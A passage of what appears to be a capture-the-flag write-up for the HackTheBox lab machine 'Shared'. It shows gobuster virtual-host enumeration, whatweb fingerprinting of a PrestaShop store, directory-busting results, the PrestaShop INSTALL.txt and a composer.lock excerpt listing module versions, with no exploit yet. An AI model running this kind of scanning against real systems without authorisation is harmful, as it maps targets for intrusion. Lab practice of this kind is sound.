+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gobuster<span class="w"> </span>vhost<span class="w"> </span>-u<span class="w"> </span>shared.htb<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/namelist.txt
+<span class="o">===============================================================</span>
+Gobuster<span class="w"> </span>v3.1.0
+by<span class="w"> </span>OJ<span class="w"> </span>Reeves<span class="w"> </span><span class="o">(</span>@TheColonial<span class="o">)</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>Christian<span class="w"> </span>Mehlmauer<span class="w"> </span><span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Url:<span class="w">          </span>http://shared.htb
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Method:<span class="w">       </span>GET
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Threads:<span class="w">      </span><span class="m">10</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Wordlist:<span class="w">     </span>/usr/share/seclists/Discovery/DNS/namelist.txt
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>Agent:<span class="w">   </span>gobuster/3.1.0
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Timeout:<span class="w">      </span><span class="nv">10s</span>
+<span class="o">===============================================================</span>
+<span class="m">2022</span>/10/16<span class="w"> </span><span class="m">20</span>:40:50<span class="w"> </span>Starting<span class="w"> </span>gobuster<span class="w"> </span><span class="k">in</span><span class="w"> </span>VHOST<span class="w"> </span>enumeration<span class="w"> </span><span class="nv">mode</span>
+<span class="o">===============================================================</span>
+Found:<span class="w"> </span>checkout.shared.htb<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">3229</span><span class="o">]</span>
+Progress:<span class="w"> </span><span class="m">24281</span><span class="w"> </span>/<span class="w"> </span><span class="m">151266</span><span class="w"> </span><span class="o">(</span><span class="m">16</span>.05%<span class="o">)</span><span class="w">                   </span>^C
+<span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Keyboard<span class="w"> </span>interrupt<span class="w"> </span>detected,<span class="w"> </span>terminating.
+
+<span class="o">===============================================================</span>
+<span class="m">2022</span>/10/16<span class="w"> </span><span class="m">20</span>:44:16<span class="w"> </span><span class="nv">Finished</span>
+<span class="o">===============================================================</span>
+</pre></div>
+</div>
+<p>Found checkout.shared.htb adding both in our hosts file</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>whatweb<span class="w"> </span>http://shared.htb
+http://shared.htb<span class="w"> </span><span class="o">[</span><span class="m">301</span><span class="w"> </span>Moved<span class="w"> </span>Permanently<span class="o">]</span><span class="w"> </span>Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>,<span class="w"> </span>HTTPServer<span class="o">[</span>nginx/1.18.0<span class="o">]</span>,<span class="w"> </span>IP<span class="o">[</span><span class="m">10</span>.10.11.172<span class="o">]</span>,<span class="w"> </span>RedirectLocation<span class="o">[</span>https://shared.htb/<span class="o">]</span>,<span class="w"> </span>nginx<span class="o">[</span><span class="m">1</span>.18.0<span class="o">]</span>
+https://shared.htb/<span class="w"> </span><span class="o">[</span><span class="m">302</span><span class="w"> </span>Found<span class="o">]</span><span class="w"> </span>Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>,<span class="w"> </span>HTTPServer<span class="o">[</span>nginx/1.18.0<span class="o">]</span>,<span class="w"> </span>IP<span class="o">[</span><span class="m">10</span>.10.11.172<span class="o">]</span>,<span class="w"> </span>RedirectLocation<span class="o">[</span>https://shared.htb/index.php<span class="o">]</span>,<span class="w"> </span>nginx<span class="o">[</span><span class="m">1</span>.18.0<span class="o">]</span>
+https://shared.htb/index.php<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="w"> </span>OK<span class="o">]</span><span class="w"> </span>Cookies<span class="o">[</span>PHPSESSID,PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c<span class="o">]</span>,<span class="w"> </span>Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>,<span class="w"> </span>HTML5,<span class="w"> </span>HTTPServer<span class="o">[</span>nginx/1.18.0<span class="o">]</span>,<span class="w"> </span>HttpOnly<span class="o">[</span>PHPSESSID,PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c<span class="o">]</span>,<span class="w"> </span>IP<span class="o">[</span><span class="m">10</span>.10.11.172<span class="o">]</span>,<span class="w"> </span>JQuery,<span class="w"> </span>Open-Graph-Protocol<span class="o">[</span>website<span class="o">]</span>,<span class="w"> </span>PoweredBy<span class="o">[</span>PrestaShop<span class="o">]</span>,<span class="w"> </span>PrestaShop<span class="o">[</span>EN<span class="o">]</span>,<span class="w"> </span>Script<span class="o">[</span>application/ld+json,text/javascript<span class="o">]</span>,<span class="w"> </span>Title<span class="o">[</span>Shared<span class="w"> </span>Shop<span class="o">]</span>,<span class="w"> </span>X-UA-Compatible<span class="o">[</span><span class="nv">ie</span><span class="o">=</span>edge<span class="o">]</span>,<span class="w"> </span>nginx<span class="o">[</span><span class="m">1</span>.18.0<span class="o">]</span>
+</pre></div>
+</div>
+<p>The PHP session Cookies say prestashop</p>
+<p>Dirbusting found quite a lot of 403 401 and so on, but the 200 are :</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">[</span><span class="m">20</span>:40:28<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>5KB<span class="w"> </span>-<span class="w"> </span>/INSTALL.txt
+<span class="o">[</span><span class="m">20</span>:40:31<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">   </span>88B<span class="w">  </span>-<span class="w"> </span>/Makefile
+<span class="o">[</span><span class="m">20</span>:44:06<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">  </span>411KB<span class="w"> </span>-<span class="w"> </span>/composer.lock
+<span class="o">[</span><span class="m">20</span>:48:01<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>3KB<span class="w"> </span>-<span class="w"> </span>/robots.txt
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>                                         <span class="o">*</span><span class="c1">#&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;.</span>
+                                    <span class="c1">#&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;(</span>
+                                <span class="o">*&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;*</span>
+                              <span class="o">&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
+                           <span class="p">,</span><span class="o">&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%%</span><span class="c1">#%%%&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
+                          <span class="o">&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;*****************</span><span class="c1">#&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
+                        <span class="p">(</span><span class="o">&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;*************************&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span><span class="p">(</span>
+                       <span class="o">&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%*****************************%&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
+                      <span class="o">&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%*********************************%&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
+                     <span class="o">%&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span><span class="p">(</span><span class="o">********</span><span class="p">,</span>            <span class="o">*********</span><span class="p">,</span>    <span class="o">/&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%</span>
+                    <span class="o">*&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;/*******.</span>     <span class="o">.*</span><span class="p">(((</span><span class="o">/.</span>    <span class="o">******</span>   <span class="o">/</span><span class="c1">#* *&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;*</span>
+                    <span class="o">&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span><span class="p">(</span><span class="o">*******</span>  <span class="o">/%%%%%%%%%%%&amp;&amp;&amp;&amp;%</span><span class="p">,</span><span class="o">***</span> <span class="o">*&amp;&amp;&amp;&amp;&amp;&amp;%/&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
+                   <span class="o">*&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%*******/%%%%%%%%%%%%%</span><span class="p">((</span><span class="o">&amp;&amp;&amp;&amp;&amp;%</span><span class="c1">#*&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%%%&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
+                   <span class="o">&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;/*****</span><span class="p">(</span><span class="o">%%%%%%%%%%%%%%</span><span class="c1">#((%&amp;&amp;&amp;&amp;%%%*&amp;&amp;&amp;&amp;&amp;&amp;&amp;(%%&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
+                   <span class="o">&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;*****%%%%%%%%%%%%%</span><span class="c1">#/, @@ %&amp;&amp;%%%%#**&amp;&amp;&amp;&amp;/#%%&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
+                   <span class="o">&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;***&amp;@@@@@@@@@@</span><span class="c1">#/////      @@%%%% ****@@  *@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
+                   <span class="o">&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;**%@@@@@@@@@@@@@@@@@@</span><span class="c1">#  /@@@%%%  *****/@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
+                   <span class="c1">#&amp;&amp;&amp;&amp;&amp;&amp;&amp;*@@@@@@@@@@@@@@@@@@@@@@@@@%%#     *******@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
+                    <span class="o">&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@@@@@@@@@@@%%</span>    <span class="o">*********</span><span class="p">(</span><span class="o">&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
+                    <span class="o">&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@&amp;@@@@@@@%</span>     <span class="o">************%&amp;&amp;&amp;&amp;&amp;&amp;%</span>
+                     <span class="o">&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@@</span> <span class="p">(</span><span class="o">@@@.</span>     <span class="o">**************</span><span class="p">(</span><span class="o">&amp;&amp;&amp;&amp;&amp;</span>
+                      <span class="o">&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@@@</span><span class="p">,</span>       <span class="o">************</span><span class="p">,,</span><span class="o">%&amp;&amp;&amp;&amp;&amp;</span>
+                       <span class="o">&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@@@*</span>     <span class="p">,,,,,,,,,,,</span><span class="o">/&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
+                        <span class="o">&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@@</span>     <span class="p">,,,,,,,,(</span><span class="o">&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
+                         <span class="o">&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span><span class="p">(</span><span class="o">***</span><span class="p">(</span><span class="o">@@@@@@@@@@@@@@@</span><span class="c1">#   .,****(&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
+                           <span class="o">&amp;&amp;&amp;&amp;%*****/</span><span class="p">(((</span><span class="o">**</span><span class="c1">#@@@@@@@@@@@#**(((/*****%&amp;&amp;&amp;&amp;</span>
+                             <span class="o">%*******</span><span class="p">(((</span><span class="o">/</span>                 <span class="o">/</span><span class="p">(((</span><span class="o">*******%</span>
+                               <span class="o">*****/</span><span class="c1">#############((((((((((((/*****</span>
+                                   <span class="o">*/</span><span class="c1">#############((((((((((((/*</span>
+                                       <span class="c1">###########((((((((((</span>
+
+
+
+<span class="o">.......</span>                              <span class="o">...</span>                 <span class="o">.****</span><span class="p">,</span>    <span class="o">**</span>
+<span class="o">..</span>   <span class="p">,</span><span class="o">....</span>                           <span class="o">...</span>                <span class="o">***</span>   <span class="o">**</span>   <span class="o">**</span>
+<span class="o">..</span>      <span class="o">..</span> <span class="o">......</span>  <span class="o">.......</span>   <span class="o">.......</span> <span class="o">.....</span>   <span class="o">.........</span>  <span class="o">**.</span>        <span class="o">**</span><span class="p">,</span><span class="o">*****.</span>   <span class="o">*******</span>   <span class="o">**.*****</span><span class="p">,</span>
+<span class="o">..</span>     <span class="o">...</span> <span class="o">...</span>    <span class="o">..</span>     <span class="o">..</span> <span class="o">...</span>      <span class="o">...</span>   <span class="o">...</span>     <span class="o">...</span>   <span class="o">******.</span>   <span class="o">***</span>    <span class="o">**</span> <span class="p">,</span><span class="o">**</span>     <span class="o">**</span><span class="p">,</span> <span class="o">***</span>    <span class="o">***</span>
+<span class="o">.........</span>  <span class="o">...</span>   <span class="o">........</span>     <span class="o">.....</span>  <span class="o">...</span>   <span class="o">..</span>      <span class="o">...</span>        <span class="o">***</span>  <span class="o">**</span>     <span class="o">**</span> <span class="o">**</span>       <span class="o">**</span> <span class="o">**</span>      <span class="o">**</span>
+<span class="o">..</span>         <span class="o">...</span>    <span class="o">...</span>    <span class="o">.</span>        <span class="o">..</span> <span class="o">...</span>   <span class="p">,</span><span class="o">..</span>     <span class="o">...</span>  <span class="o">*</span><span class="p">,</span>     <span class="o">**</span>  <span class="o">**</span>     <span class="o">**</span> <span class="o">***</span>     <span class="o">***</span> <span class="o">***</span>    <span class="p">,</span><span class="o">**</span>
+<span class="o">..</span>         <span class="o">...</span>     <span class="o">.......</span>  <span class="p">,</span><span class="o">......</span>   <span class="o">.....</span>  <span class="o">.........</span>  <span class="o">********</span>   <span class="o">**</span>     <span class="o">**</span>   <span class="o">*******</span>   <span class="o">**</span> <span class="o">******</span>
+                                                                                         <span class="o">**</span>
+
+             <span class="o">---</span> <span class="o">=====</span> <span class="n">Installation</span> <span class="n">instructions</span> <span class="k">for</span> <span class="n">PrestaShop</span> <span class="mf">1.7</span> <span class="o">=====</span> <span class="o">---</span>
+
+
+
+<span class="o">===</span> <span class="n">Prerequirements</span>
+
+<span class="n">To</span> <span class="n">install</span> <span class="n">PrestaShop</span> <span class="mf">1.7</span><span class="p">,</span> <span class="n">you</span> <span class="n">need</span> <span class="n">a</span> <span class="n">web</span> <span class="n">server</span> <span class="n">running</span> <span class="n">PHP</span> <span class="mf">7.1.3</span><span class="o">+</span> <span class="ow">and</span> <span class="nb">any</span> <span class="n">flavor</span> <span class="n">of</span> <span class="n">MySQL</span> <span class="mf">5.5</span><span class="o">+</span> <span class="p">(</span><span class="n">MySQL</span><span class="p">,</span> <span class="n">MariaDB</span><span class="p">,</span> <span class="n">Percona</span> <span class="n">Server</span><span class="p">,</span> <span class="n">etc</span><span class="o">.</span><span class="p">)</span><span class="o">.</span>
+
+<span class="n">You</span> <span class="n">can</span> <span class="n">find</span> <span class="n">more</span> <span class="n">information</span> <span class="n">on</span> <span class="n">our</span> <span class="n">System</span> <span class="n">requirements</span> <span class="p">(</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">devdocs</span><span class="o">.</span><span class="n">prestashop</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="mf">1.7</span><span class="o">/</span><span class="n">basics</span><span class="o">/</span><span class="n">installation</span><span class="o">/</span><span class="n">system</span><span class="o">-</span><span class="n">requirements</span><span class="o">/</span><span class="p">)</span> <span class="n">page</span> <span class="ow">and</span> <span class="n">on</span> <span class="n">the</span> <span class="n">System</span> <span class="n">Administrator</span> <span class="n">Guide</span> <span class="p">(</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">doc</span><span class="o">.</span><span class="n">prestashop</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">display</span><span class="o">/</span><span class="n">PS16</span><span class="o">/</span><span class="n">System</span><span class="o">+</span><span class="n">Administrator</span><span class="o">+</span><span class="n">Guide</span><span class="p">)</span><span class="o">.</span>
+
+<span class="o">===</span> <span class="n">Installing</span> <span class="n">PrestaShop</span>
+
+<span class="n">Since</span> <span class="n">you</span> <span class="n">are</span> <span class="n">reading</span> <span class="n">this</span> <span class="n">file</span><span class="p">,</span> <span class="n">you</span> <span class="n">have</span> <span class="n">already</span> <span class="n">downloaded</span> <span class="n">the</span> <span class="n">latest</span> <span class="n">PrestaShop</span> <span class="n">Zip</span> <span class="n">archive</span> <span class="ow">and</span> <span class="n">unzipped</span><span class="o">.</span>
+
+<span class="n">Here</span> <span class="ow">is</span> <span class="n">the</span> <span class="n">content</span> <span class="n">of</span> <span class="n">this</span> <span class="n">archive</span><span class="p">:</span>
+
+<span class="o">*</span> <span class="n">The</span> <span class="n">prestashop</span><span class="o">.</span><span class="n">zip</span> <span class="n">archive</span><span class="p">,</span> <span class="n">which</span> <span class="n">contains</span> <span class="nb">all</span> <span class="n">the</span> <span class="n">necessary</span> <span class="n">files</span><span class="o">.</span>
+<span class="o">*</span> <span class="n">The</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span> <span class="n">file</span><span class="p">,</span> <span class="n">which</span> <span class="n">will</span> <span class="n">automatically</span> <span class="n">unzip</span> <span class="n">the</span> <span class="n">prestashop</span><span class="o">.</span><span class="n">zip</span> <span class="n">archive</span> <span class="k">for</span> <span class="n">you</span><span class="o">.</span>
+<span class="o">*</span> <span class="n">The</span> <span class="n">Install_PrestaShop</span><span class="o">.</span><span class="n">html</span> <span class="n">file</span><span class="p">,</span> <span class="n">which</span> <span class="n">redirects</span> <span class="n">you</span> <span class="n">to</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">doc</span><span class="o">.</span><span class="n">prestashop</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">display</span><span class="o">/</span><span class="n">PS17</span><span class="o">/</span><span class="n">Installing</span><span class="o">+</span><span class="n">PrestaShop</span>
+
+<span class="n">From</span> <span class="n">there</span> <span class="n">on</span><span class="p">,</span> <span class="n">follow</span> <span class="n">these</span> <span class="n">instructions</span><span class="p">:</span>
+
+<span class="mf">1.</span> <span class="n">Upload</span> <span class="n">at</span> <span class="n">least</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span> <span class="ow">and</span> <span class="n">prestashop</span><span class="o">.</span><span class="n">zip</span> <span class="n">on</span> <span class="n">your</span> <span class="n">web</span> <span class="n">server</span><span class="o">.</span>
+<span class="mf">2.</span> <span class="n">From</span> <span class="n">your</span> <span class="n">web</span> <span class="n">browser</span><span class="p">,</span> <span class="n">go</span> <span class="n">to</span> <span class="n">the</span> <span class="n">folder</span> <span class="n">where</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span> <span class="ow">and</span> <span class="n">prestashop</span><span class="o">.</span><span class="n">zip</span> <span class="n">have</span> <span class="n">been</span> <span class="n">uploaded</span> <span class="ow">and</span> <span class="n">browse</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="o">.</span> <span class="n">The</span> <span class="n">Zip</span> <span class="n">archive</span> <span class="n">should</span> <span class="n">unzip</span> <span class="n">automatically</span><span class="o">.</span>
+<span class="mf">3.</span> <span class="n">You</span> <span class="n">are</span> <span class="n">redirected</span> <span class="n">to</span> <span class="n">the</span> <span class="n">PrestaShop</span> <span class="n">installer</span><span class="o">.</span> <span class="n">Follow</span> <span class="n">the</span> <span class="n">instructions</span><span class="o">.</span>
+
+<span class="n">After</span> <span class="n">PrestaShop</span> <span class="n">has</span> <span class="n">successfuly</span> <span class="n">been</span> <span class="n">installed</span><span class="p">,</span> <span class="n">delete</span> <span class="n">the</span> <span class="o">/</span><span class="n">install</span><span class="o">/</span> <span class="n">folder</span> <span class="kn">from</span> <span class="nn">your</span> <span class="n">server</span><span class="o">.</span>
+
+<span class="n">Enjoy</span> <span class="n">your</span> <span class="n">store</span> <span class="p">:)</span>
+
+
+
+
+<span class="n">Essential</span> <span class="n">links</span> <span class="n">about</span> <span class="n">PrestaShop</span><span class="p">:</span>
+
+<span class="o">*</span> <span class="n">User</span> <span class="n">Guide</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">doc</span><span class="o">.</span><span class="n">prestashop</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">display</span><span class="o">/</span><span class="n">PS17</span><span class="o">/</span><span class="n">User</span><span class="o">+</span><span class="n">Guide</span>
+<span class="o">*</span> <span class="n">Tech</span> <span class="n">docs</span> <span class="p">(</span><span class="n">modules</span> <span class="o">&amp;</span> <span class="n">themes</span><span class="p">):</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">devdocs</span><span class="o">.</span><span class="n">prestashop</span><span class="o">.</span><span class="n">com</span><span class="o">/</span>
+<span class="o">*</span> <span class="n">Official</span> <span class="n">blog</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">prestashop</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">en</span><span class="o">/</span><span class="n">blog</span>
+<span class="o">*</span> <span class="n">Developer</span> <span class="n">blog</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">build</span><span class="o">.</span><span class="n">prestashop</span><span class="o">.</span><span class="n">com</span><span class="o">/</span>
+<span class="o">*</span> <span class="n">Get</span> <span class="n">community</span> <span class="n">support</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">prestashop</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">forums</span><span class="o">/</span>
+<span class="o">*</span> <span class="n">Get</span> <span class="n">paid</span> <span class="n">support</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">prestashop</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">en</span><span class="o">/</span><span class="n">support</span>
+<span class="o">*</span> <span class="n">Find</span> <span class="n">modules</span> <span class="ow">and</span> <span class="n">themes</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">addons</span><span class="o">.</span><span class="n">prestashop</span><span class="o">.</span><span class="n">com</span><span class="o">/</span>
+<span class="o">*</span> <span class="n">Contribute</span> <span class="k">with</span> <span class="n">code</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">PrestaShop</span><span class="o">/</span><span class="n">PrestaShop</span>
+<span class="o">*</span> <span class="n">Contribute</span> <span class="k">with</span> <span class="n">translation</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">crowdin</span><span class="o">.</span><span class="n">net</span><span class="o">/</span><span class="n">project</span><span class="o">/</span><span class="n">prestashop</span><span class="o">-</span><span class="n">official</span>
+
+
+
+
+                       <span class="n">PrestaShop</span> <span class="o">-</span> <span class="n">WeCommerce</span> <span class="n">Is</span> <span class="n">Better</span> <span class="n">eCommerce</span>
+
+</pre></div>
+</div>
+<p>from the composer.lock</p>
+<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="w">        </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;prestashop/blockwishlist&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;version&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;v2.0.1&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;source&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;git&quot;</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;url&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://github.com/PrestaShop/blockwishlist.git&quot;</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;reference&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;51d527730ce58aac136aac37f624592696be6f9d&quot;</span>
+<span class="w">            </span><span class="p">},</span>
+<span class="w">            </span><span class="nt">&quot;dist&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;zip&quot;</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;url&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://api.github.com/repos/PrestaShop/blockwishlist/zipball/51d527730ce58aac136aac37f624592696be6f9d&quot;</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;reference&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;51d527730ce58aac136aac37f624592696be6f9d&quot;</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;shasum&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span>
+<span class="w">            </span><span class="p">},</span>
+<span class="w">            </span><span class="nt">&quot;require-dev&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="nt">&quot;prestashop/php-dev-tools&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;~3.0&quot;</span>
+<span class="w">            </span><span class="p">},</span>
+<span class="w">            </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;prestashop-module&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;autoload&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="nt">&quot;psr-4&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="nt">&quot;PrestaShop\\Module\\BlockWishList\\&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;src/&quot;</span>
+<span class="w">                </span><span class="p">},</span>
+<span class="w">                </span><span class="nt">&quot;classmap&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">                    </span><span class="s2">&quot;blockwishlist.php&quot;</span><span class="p">,</span>
+<span class="w">                    </span><span class="s2">&quot;controllers&quot;</span><span class="p">,</span>
+<span class="w">                    </span><span class="s2">&quot;classes&quot;</span>
+<span class="w">                </span><span class="p">]</span>
+<span class="w">            </span><span class="p">},</span>
+<span class="w">            </span><span class="nt">&quot;notification-url&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://packagist.org/downloads/&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;license&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">                </span><span class="s2">&quot;AFL-3.0&quot;</span>
+<span class="w">            </span><span class="p">],</span>
+<span class="w">            </span><span class="nt">&quot;authors&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">                </span><span class="p">{</span>
+<span class="w">                    </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;PrestaShop SA&quot;</span><span class="p">,</span>
+<span class="w">                    </span><span class="nt">&quot;email&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;contact@prestashop.com&quot;</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="w">            </span><span class="p">],</span>
+<span class="w">            </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;PrestaShop module blockwishlist&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;homepage&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://github.com/PrestaShop/blockwishlist&quot;</span><span class="p">,</span>
